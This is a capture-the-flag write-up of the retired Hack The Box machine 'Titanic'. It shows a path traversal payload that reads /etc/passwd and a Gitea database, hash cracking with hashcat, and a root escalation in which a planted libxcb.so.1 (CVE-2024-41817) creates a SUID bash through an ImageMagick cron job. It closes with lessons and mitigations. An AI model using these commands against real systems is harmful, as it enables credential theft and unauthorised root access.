---
machine: Titanic
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, flask, gitea, imagemagick]
---

# Titanic — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The Flask application joins the ticket with `os.path.join` and allows path traversal in `/download`. Read Gitea's `.git` and SQLite database, crack `developer`'s hash and log in over SSH. A cron converts images with ImageMagick and is vulnerable to CVE-2024-41817: a `libxcb.so.1` in the working directory is loaded as root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 22.04 and `80/tcp` Apache serving a booking site.
- The `titanic.htb` vhost has a form that downloads a JSON “ticket”.
- `gitea.titanic.htb` hosts Gitea and a public repository.

## Enumeration

- `/download?ticket=../../etc/passwd` returns the file: `os.path.join` does not confine the path.
- The Gitea repository includes `app.py` and the `gitea.db` path.
- The database contains `developer`'s hash and the repository reveals the ImageMagick cron job.

## Foothold

Download `gitea.db` through the traversal and crack `developer`'s hash. Use the password for SSH; the user flag is in the home directory.

```bash
curl 'http://titanic.htb/download?ticket=../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db
sqlite3 gitea.db 'select name,passwd_hash_algo,passwd from user;'
hashcat -m 10900 hash.txt rockyou.txt
ssh developer@titanic.htb
```

## Lateral movement

There is no other host. The pivot is from the web to the Gitea database, then to `developer`'s password and local SSH access.

## Privilege escalation

Root's cron runs `magick` on `/opt/automation/urgent/*.jpg`. ImageMagick 7.1.1-35 is vulnerable to CVE-2024-41817: it loads `libxcb.so.1` from the current directory. Compile a library whose constructor copies `/bin/bash` and sets SUID, place it next to an image and wait for cron.

```bash
gcc -shared -fPIC -o libxcb.so.1 pwn.c
cp libxcb.so.1 /opt/automation/urgent/
cp image.jpg /opt/automation/urgent/
# wait for cron and run /tmp/rootbash -p
```

## Evidence

- `/etc/passwd` read with `ticket=../../`.
- Cracked `developer` hash and SSH session.
- `libxcb.so.1` loaded by cron and `/tmp/rootbash` with SUID.

## Lessons learned

- `os.path.join` does not prevent traversal unless input is normalized.
- Gitea repositories and databases can leak credentials.
- Vulnerable ImageMagick loads libraries from the working directory.

## Mitigation and detection

- Resolve the path and verify it stays inside the allowed directory.
- Restrict access to `.git` and the Gitea database.
- Update ImageMagick and run conversions in a non-writable directory.

## References

- [0xdf — Titanic](https://0xdf.gitlab.io/2025/06/21/htb-titanic.html)
- [IppSec — Titanic](https://www.youtube.com/watch?v=2tQ3VhdwVsU)
- [Hack The Box — Titanic](https://app.hackthebox.com/machines/titanic)
